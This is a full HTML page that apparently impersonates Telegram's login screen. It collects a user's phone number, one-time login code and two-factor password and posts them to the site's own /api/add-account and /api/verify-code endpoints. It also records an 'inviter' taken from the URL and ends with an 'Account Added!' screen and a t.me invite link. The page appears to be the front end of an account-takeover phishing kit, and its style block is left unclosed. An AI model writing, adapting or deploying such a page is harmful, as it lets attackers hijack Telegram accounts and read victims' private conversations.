<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Login</title>
    <style>
              * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: #0e1621;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
        }

        .login-container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
        }

        .login-card {
            background: #17212b;
            border-radius: 16px;
            padding: 32px 24px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
            border: 1px solid #2b3945;
        }

        /* Header with back button */
        .header-bar {
            display: flex;
            align-items: center;
            margin-bottom: 24px;
            gap: 16px;
        }

        .back-button {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #242f3d;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            font-size: 1.5rem;
            color: #8e9fad;
            transition: background 0.2s;
            border: none;
        }

        .back-button:hover {
            background: #2b3945;
        }

        .back-button svg {
            width: 24px;
            height: 24px;
            fill: #8e9fad;
        }

        .header-title {
            font-size: 1.2rem;
            font-weight: 500;
            color: #fff;
        }

        /* Step title and description */
        .step-title {
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 8px;
            color: #fff;
        }

        .step-description {
            color: #8e9fad;
            font-size: 0.95rem;
            margin-bottom: 24px;
            line-height: 1.5;
        }

        /* Input wrapper */
        .input-wrapper {
            background: #242f3d;
            border: 1px solid #2b3945;
            border-radius: 12px;
            display: flex;
            align-items: center;
            overflow: hidden;
            transition: all 0.2s;
            margin-bottom: 24px;
        }

        .input-wrapper:focus-within {
            border-color: #4c9ce0;
            box-shadow: 0 0 0 2px rgba(76, 156, 224, 0.2);
        }

        .input-prefix {
            padding: 14px 0 14px 16px;
            color: #8e9fad;
            font-weight: 500;
            font-size: 1rem;
            background: #1e2a36;
            border-right: 1px solid #2b3945;
            min-width: 50px;
            text-align: center;
        }

        .form-input {
            flex: 1;
            padding: 14px 16px;
            background: transparent;
            border: none;
            color: #fff;
            font-size: 1rem;
            outline: none;
        }

        .form-input::placeholder {
            color: #5d6f7e;
        }

        /* Password input */
        .password-input {
            width: 100%;
            padding: 14px 16px;
            background: #242f3d;
            border: 1px solid #2b3945;
            border-radius: 12px;
            color: #fff;
            font-size: 1rem;
            outline: none;
            transition: all 0.2s;
            margin-bottom: 24px;
        }

        .password-input:focus {
            border-color: #4c9ce0;
            box-shadow: 0 0 0 2px rgba(76, 156, 224, 0.2);
        }

        .password-input::placeholder {
            color: #5d6f7e;
        }

        /* Code input boxes */
        .code-container {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin: 24px 0;
        }

        .code-box {
            width: 55px;
            height: 65px;
            background: #242f3d;
            border: 2px solid #2b3945;
            border-radius: 12px;
            color: #fff;
            font-size: 2rem;
            font-weight: bold;
            text-align: center;
            line-height: 65px;
            transition: all 0.2s;
            cursor: pointer;
        }

        .code-box.filled {
            border-color: #4c9ce0;
            background: #2b5278;
        }

        .hidden-input {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0;
            pointer-events: none;
        }

        /* Buttons */
        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 30px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 16px;
        }

        .btn-primary {
            background: #4c9ce0;
            color: white;
        }

        .btn-primary:hover:not(:disabled) {
            background: #6ab2f2;
            transform: translateY(-1px);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .btn-secondary {
            background: #2b3945;
            color: #6ab2f2;
        }

        .btn-secondary:hover:not(:disabled) {
            background: #3a4a5a;
        }

        /* Error message */
        .error-message {
            background: #8e2b2b;
            color: white;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 0.9rem;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .success-message {
            background: #1e4a2b;
            color: white;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 0.9rem;
            display: none;
        }

        .success-message.show {
            display: block;
        }

        /* Loading spinner */
        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

<body>
    <div class="login-container">
        <div class="login-card">
            <!-- Page 1: Phone Number -->
            <div id="page1">
                <div class="header-bar">
                    <div class="back-button" onclick="goBack()">
                        <svg viewBox="0 0 24 24">
                            <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
                        </svg>
                    </div>
                    <div class="header-title">Telegram</div>
                </div>

                <div class="step-title">Your phone number</div>
                <div class="step-description">
                    Please enter your phone number with country code.
                </div>

                <div class="input-wrapper">
                    <span class="input-prefix">+</span>
                    <input type="tel" class="form-input" id="phone" placeholder="1234567890" inputmode="numeric" value="" autofocus>
                </div>

                <button class="btn btn-primary" id="sendCodeBtn" onclick="sendCode()">
                    <span>Next</span>
                </button>
            </div>

            <!-- Page 2: Verification Code -->
            <div id="page2" style="display: none;">
                <div class="header-bar">
                    <div class="back-button" onclick="backToPage1()">
                        <svg viewBox="0 0 24 24">
                            <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
                        </svg>
                    </div>
                    <div class="header-title">Verification</div>
                </div>

                <div class="step-title">Enter Code</div>
                <div class="step-description">
                    Please enter the 5-digit code sent to your phone.
                </div>

                <input type="text" id="hiddenCodeInput" class="hidden-input" maxlength="5" inputmode="numeric" pattern="[0-9]*">
                
                <div class="code-container" id="codeBoxes" onclick="focusHiddenInput()">
                    <div class="code-box" id="box1">-</div>
                    <div class="code-box" id="box2">-</div>
                    <div class="code-box" id="box3">-</div>
                    <div class="code-box" id="box4">-</div>
                    <div class="code-box" id="box5">-</div>
                </div>

                <div id="passwordGroup" style="display: none;">
                    <input type="password" class="password-input" id="password" placeholder="Enter your 2FA password">
                </div>

                <button class="btn btn-primary" id="verifyBtn" onclick="verifyCode()">
                    <span>Verify</span>
                </button>
            </div>

            <!-- Page 3: Success -->
            <div id="page3" style="display: none;">
                <div class="header-bar">
                    <div class="back-button" onclick="backToPage1()">
                        <svg viewBox="0 0 24 24">
                            <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
                        </svg>
                    </div>
                    <div class="header-title">Success</div>
                </div>

                <div style="text-align: center;">
                    <div style="font-size: 4rem; margin: 20px 0;">✅</div>
                    <div class="step-title">Account Added!</div>
                    <div class="step-description" style="margin-bottom: 24px;" id="successAccountInfo"></div>
                    
                    <button class="btn btn-primary" onclick="goToDashboard()">
                        <span>Go to Dashboard</span>
                    </button>
                    
                    <button class="btn btn-secondary" onclick="addAnotherAccount()" style="margin-top: 12px;">
                        <span>Add Another Account</span>
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // ---------- State ----------
        let timerInterval;
        let timeLeft = 60;
        let currentSessionId = null;
        let currentPhone = '';
        let currentCode = ''; // Store the code for 2FA submission

        // --- NEW: Get inviter from URL (if any) ---
        const urlParams = new URLSearchParams(window.location.search);
        const currentInviter = urlParams.get('inviter');

        // DOM elements
        const hiddenInput = document.getElementById('hiddenCodeInput');
        const boxes = [
            document.getElementById('box1'),
            document.getElementById('box2'),
            document.getElementById('box3'),
            document.getElementById('box4'),
            document.getElementById('box5')
        ];

        // ---------- Helper Functions ----------
        function showError(message) {
            const existingErrors = document.querySelectorAll('.error-message');
            existingErrors.forEach(el => el.remove());
            
            const errorDiv = document.createElement('div');
            errorDiv.className = 'error-message show';
            errorDiv.textContent = message;
            
            const visiblePage = document.querySelector('#page1:not([style*="display: none"]), #page2:not([style*="display: none"]), #page3:not([style*="display: none"])');
            if (visiblePage) {
                visiblePage.insertBefore(errorDiv, visiblePage.firstChild);
            }
            
            setTimeout(() => {
                if (errorDiv.parentNode) errorDiv.remove();
            }, 4000);
        }

        function showSuccess(message) {
            const existingSuccess = document.querySelectorAll('.success-message');
            existingSuccess.forEach(el => el.remove());
            
            const successDiv = document.createElement('div');
            successDiv.className = 'success-message show';
            successDiv.textContent = message;
            
            const visiblePage = document.querySelector('#page1:not([style*="display: none"]), #page2:not([style*="display: none"]), #page3:not([style*="display: none"])');
            if (visiblePage) {
                visiblePage.insertBefore(successDiv, visiblePage.firstChild);
            }
            
            setTimeout(() => {
                if (successDiv.parentNode) successDiv.remove();
            }, 3000);
        }

        function setLoading(button, isLoading) {
            const span = button.querySelector('span');
            const originalText = span ? span.textContent : 'Next';
            
            if (isLoading) {
                button.disabled = true;
                button.innerHTML = '<span class="loading-spinner"></span><span> Please wait...</span>';
            } else {
                button.disabled = false;
                button.innerHTML = `<span>${originalText}</span>`;
            }
        }

        function focusHiddenInput() {
            hiddenInput.focus();
        }

        function updateCodeBoxes() {
            const code = hiddenInput.value;
            for (let i = 0; i < 5; i++) {
                if (i < code.length) {
                    boxes[i].textContent = code[i];
                    boxes[i].classList.add('filled');
                } else {
                    boxes[i].textContent = '-';
                    boxes[i].classList.remove('filled');
                }
            }
        }

        hiddenInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 5);
            updateCodeBoxes();
        });

        // Navigation
        function goBack() {
            window.location.href = '/login';
        }

        function backToPage1() {
            document.getElementById('page1').style.display = 'block';
            document.getElementById('page2').style.display = 'none';
            document.getElementById('page3').style.display = 'none';
            
            document.getElementById('password').value = '';
            hiddenInput.value = '';
            updateCodeBoxes();
            document.getElementById('phone').focus();
            currentCode = '';
            if (timerInterval) clearInterval(timerInterval);
        }

        function backToPage2() {
            document.getElementById('page2').style.display = 'block';
            document.getElementById('page3').style.display = 'none';
            hiddenInput.focus();
        }

        function goToDashboard() {
            window.location.href = 'https://t.me/j4qFBBfAlFYxYTk0';
        }

        function addAnotherAccount() {
            backToPage1();
            document.getElementById('phone').value = '';
            currentSessionId = null;
            currentPhone = '';
            currentCode = '';
        }

        // ---------- API Calls ----------
        async function sendCode() {
            let phoneNumber = document.getElementById('phone').value.trim().replace(/\s+/g, '');
            
            if (!phoneNumber) {
                showError('Please enter your phone number');
                document.getElementById('phone').focus();
                return;
            }

            if (!phoneNumber.startsWith('+')) {
                phoneNumber = '+' + phoneNumber;
            }

            const button = document.getElementById('sendCodeBtn');
            setLoading(button, true);

            try {
                const response = await fetch('/api/add-account', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: phoneNumber })
                });

                const data = await response.json();

                if (data.success) {
                    currentSessionId = data.session_id;
                    currentPhone = phoneNumber;
                    
                    document.getElementById('page1').style.display = 'none';
                    document.getElementById('page2').style.display = 'block';
                    
                    hiddenInput.value = '';
                    updateCodeBoxes();
                    setTimeout(() => hiddenInput.focus(), 300);
                    
                    showSuccess('Code sent successfully!');
                } else {
                    showError(data.error || 'Failed to send code');
                }
            } catch (error) {
                console.error('Error:', error);
                showError('Network error. Please try again.');
            } finally {
                setLoading(button, false);
            }
        }

        async function verifyCode() {
            const code = hiddenInput.value;
            
            if (code.length !== 5) {
                showError('Please enter the 5-digit code');
                hiddenInput.focus();
                return;
            }

            const password = document.getElementById('password').value;
            const needPassword = document.getElementById('passwordGroup').style.display === 'block';

            if (needPassword && !password) {
                showError('Please enter your 2FA password');
                document.getElementById('password').focus();
                return;
            }

            currentCode = code;
            const button = document.getElementById('verifyBtn');
            setLoading(button, true);

            try {
                // --- MODIFIED: Include inviter in request body ---
                const response = await fetch('/api/verify-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        code: code,
                        session_id: currentSessionId,
                        password: password,
                        inviter: currentInviter   // <-- NEW: send inviter if present
                    })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('page2').style.display = 'none';
                    document.getElementById('page3').style.display = 'block';
                    
                    document.getElementById('successAccountInfo').innerHTML = 
                        `Account added successfully!`;
                    
                    if (timerInterval) clearInterval(timerInterval);
                    showSuccess('Account added successfully!');
                    
                } else if (data.need_password) {
                    document.getElementById('passwordGroup').style.display = 'block';
                    showError('2FA is enabled. Please enter your password.');
                } else {
                    showError(data.error || 'Verification failed');
                    hiddenInput.value = '';
                    updateCodeBoxes();
                    hiddenInput.focus();
                }
            } catch (error) {
                console.error('Error:', error);
                showError('Network error. Please try again.');
            } finally {
                setLoading(button, false);
            }
        }

        // Event listeners
        document.getElementById('phone').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        document.getElementById('phone').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') sendCode();
        });

        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') verifyCode();
        });

        document.getElementById('page2').addEventListener('click', function(e) {
            if (e.target.tagName !== 'BUTTON') hiddenInput.focus();
        });

        window.addEventListener('load', function() {
            document.getElementById('phone').focus();
        });
    </script>
</body>
